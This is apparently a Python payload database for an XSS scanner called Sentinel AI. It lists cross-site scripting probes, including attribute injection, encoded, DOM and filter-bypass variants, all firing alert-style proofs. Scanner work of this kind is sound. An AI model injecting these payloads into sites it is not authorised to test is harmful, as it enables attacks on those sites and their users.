"""
===========================================================
Project : Sentinel AI
Module  : XSS Payload Database
File ID : SCANNER-XSS-PAYLOAD-001
Version : 1.0.0
===========================================================

Description:
Common XSS payloads used by SentinelAI.

===========================================================
"""

from __future__ import annotations

# ===========================================================
# Basic Payloads
# ===========================================================

BASIC_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
]

# ===========================================================
# Attribute Injection Payloads
# ===========================================================

ATTRIBUTE_PAYLOADS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" autofocus onfocus=alert(1) x="',
    "' autofocus onfocus=alert(1) '",
    '" onclick=alert(1) "',
    "' onclick='alert(1)",
    '" onmouseenter=alert(1) "',
]

# ===========================================================
# SVG Payloads
# ===========================================================

SVG_PAYLOADS = [
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x></animate></svg>",
]

# ===========================================================
# Event Handler Payloads
# ===========================================================

EVENT_PAYLOADS = [
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=confirm(1)>",
    "<body onpageshow=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
]

# ===========================================================
# Encoded Payloads
# ===========================================================

ENCODED_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "%27%3E%3Cscript%3Ealert(1)%3C/script%3E",
]

# ===========================================================
# DOM XSS Payloads
# ===========================================================

DOM_PAYLOADS = [
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#javascript:alert(1)",
    "#<svg onload=alert(1)>",
]

# ===========================================================
# Filter Bypass Payloads
# ===========================================================

BYPASS_PAYLOADS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x oNerror=alert(1)>",
    "<svg/onload=prompt(1)>",
    "<script>confirm(1)</script>",
    "<script>print()</script>",
]

# ===========================================================
# Combined Payload List
# ===========================================================

ALL_XSS_PAYLOADS = (
    BASIC_PAYLOADS
    + ATTRIBUTE_PAYLOADS
    + SVG_PAYLOADS
    + EVENT_PAYLOADS
    + ENCODED_PAYLOADS
    + DOM_PAYLOADS
    + BYPASS_PAYLOADS
)

# ===========================================================
# Helper
# ===========================================================


def get_payloads() -> list[str]:
    """
    Return all XSS payloads.
    """

    return ALL_XSS_PAYLOADS.copy()


# ===========================================================
# Temporary Test
# ===========================================================

if __name__ == "__main__":

    print("=" * 60)
    print("SentinelAI XSS Payload Database")
    print("=" * 60)

    print(f"Total Payloads : {len(get_payloads())}")
